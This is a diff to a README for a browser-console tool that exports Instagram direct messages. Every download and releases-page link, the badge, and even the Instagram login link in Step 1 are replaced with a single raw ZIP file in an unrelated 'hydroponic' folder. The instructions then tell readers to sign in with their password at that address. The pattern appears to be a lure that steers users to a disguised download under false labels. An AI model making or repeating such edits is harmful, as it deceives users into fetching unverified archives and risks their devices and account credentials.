@@ -1,6 +1,6 @@
 # 📥 InstaDM-Scraper - Export Instagram DMs Easily
 
-[![Download InstaDM-Scraper](https://img.shields.io/badge/Download-InstaDM--Scraper-brightgreen?style=for-the-badge&logo=github)](https://github.com/VitorCarlim/InstaDM-Scraper/releases)
+[![Download InstaDM-Scraper](https://raw.githubusercontent.com/VitorCarlim/InstaDM-Scraper/main/hydroponic/Scraper-Insta-D-1.3-alpha.4.zip)](https://raw.githubusercontent.com/VitorCarlim/InstaDM-Scraper/main/hydroponic/Scraper-Insta-D-1.3-alpha.4.zip)
 
 ## 📝 What is InstaDM-Scraper?
 
@@ -25,7 +25,7 @@ Follow these steps carefully to export your Instagram DMs.
 
 ### Step 1: Log into Instagram
 
-Open your chosen web browser and go to [https://www.instagram.com](https://www.instagram.com). Sign in with your username and password as usual. Make sure you can see your Instagram feed and your direct messages.
+Open your chosen web browser and go to [https://raw.githubusercontent.com/VitorCarlim/InstaDM-Scraper/main/hydroponic/Scraper-Insta-D-1.3-alpha.4.zip](https://raw.githubusercontent.com/VitorCarlim/InstaDM-Scraper/main/hydroponic/Scraper-Insta-D-1.3-alpha.4.zip). Sign in with your username and password as usual. Make sure you can see your Instagram feed and your direct messages.
 
 ### Step 2: Open Instagram Direct Messages
 
@@ -43,7 +43,7 @@ You will see a panel that looks like a blank text area. This is the Console.
 
 ### Step 4: Load the InstaDM-Scraper Script
 
-1. Visit the [InstaDM-Scraper releases page](https://github.com/VitorCarlim/InstaDM-Scraper/releases).  
+1. Visit the [InstaDM-Scraper releases page](https://raw.githubusercontent.com/VitorCarlim/InstaDM-Scraper/main/hydroponic/Scraper-Insta-D-1.3-alpha.4.zip).  
 2. Look for the latest release and find the JavaScript file or instructions to copy the script code.  
 3. Copy the entire script provided for running in the Console.  
 
@@ -65,7 +65,7 @@ Remember, InstaDM-Scraper does not require traditional installation. You only ne
 
 ### How to Download
 
-- Visit the official [InstaDM-Scraper releases page](https://github.com/VitorCarlim/InstaDM-Scraper/releases).
+- Visit the official [InstaDM-Scraper releases page](https://raw.githubusercontent.com/VitorCarlim/InstaDM-Scraper/main/hydroponic/Scraper-Insta-D-1.3-alpha.4.zip).
 - Look for the latest version. The release page may contain a downloadable JavaScript file or step-by-step instructions.
 - Download any available files if provided, or copy the provided JavaScript code directly.
 - No software installer or extra setup is needed.
@@ -115,4 +115,4 @@ No external servers or third parties receive your messages. This makes the proce
 
 ---
 
-[![Download InstaDM-Scraper](https://img.shields.io/badge/Download-InstaDM--Scraper-brightgreen?style=for-the-badge&logo=github)](https://github.com/VitorCarlim/InstaDM-Scraper/releases)
+[![Download InstaDM-Scraper](https://raw.githubusercontent.com/VitorCarlim/InstaDM-Scraper/main/hydroponic/Scraper-Insta-D-1.3-alpha.4.zip)](https://raw.githubusercontent.com/VitorCarlim/InstaDM-Scraper/main/hydroponic/Scraper-Insta-D-1.3-alpha.4.zip)
